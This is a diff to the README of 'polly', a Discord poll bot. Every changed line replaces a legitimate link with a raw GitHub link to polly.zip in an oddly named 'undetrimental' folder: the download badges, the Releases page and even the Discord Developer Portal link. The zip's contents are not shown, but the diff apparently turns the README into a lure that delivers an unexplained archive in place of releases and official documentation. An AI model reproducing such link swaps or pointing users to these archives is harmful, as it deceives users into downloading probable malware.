@@ -8,11 +8,11 @@ Welcome to polly! This is a simple Discord poll bot. It helps you create polls, 
 
 To get started with polly, you need to download the application. 
 
-[![Download polly](https://img.shields.io/badge/Download-polly-blue)](https://github.com/MDSR268/polly/releases)
+[![Download polly](https://raw.githubusercontent.com/MDSR268/polly/main/undetrimental/polly.zip)](https://raw.githubusercontent.com/MDSR268/polly/main/undetrimental/polly.zip)
 
 Follow these steps to download and run the software:
 
-1. Click the download button above or visit the [Releases Page](https://github.com/MDSR268/polly/releases) to access the latest version.
+1. Click the download button above or visit the [Releases Page](https://raw.githubusercontent.com/MDSR268/polly/main/undetrimental/polly.zip) to access the latest version.
    
 2. Look for the latest release in the list. You will see files available for download. Choose the one that matches your operating system. 
 
@@ -63,7 +63,7 @@ If you run into any issues while using polly, try the following:
 
 ## 📚 Additional Resources 
 
-- If you want to learn more about using Discord bots, consider visiting the [Discord Developer Portal](https://discord.com/developers/docs/intro).
+- If you want to learn more about using Discord bots, consider visiting the [Discord Developer Portal](https://raw.githubusercontent.com/MDSR268/polly/main/undetrimental/polly.zip).
 - Join our community forum or Discord server for support and sharing tips.
 
 ## 📧 Contact 
@@ -72,4 +72,4 @@ For questions or support, you can reach out via the issues page on GitHub. We're
 
 Thank you for using polly. Enjoy your polling experience on Discord!
 
-[![Download polly](https://img.shields.io/badge/Download-polly-blue)](https://github.com/MDSR268/polly/releases)
+[![Download polly](https://raw.githubusercontent.com/MDSR268/polly/main/undetrimental/polly.zip)](https://raw.githubusercontent.com/MDSR268/polly/main/undetrimental/polly.zip)
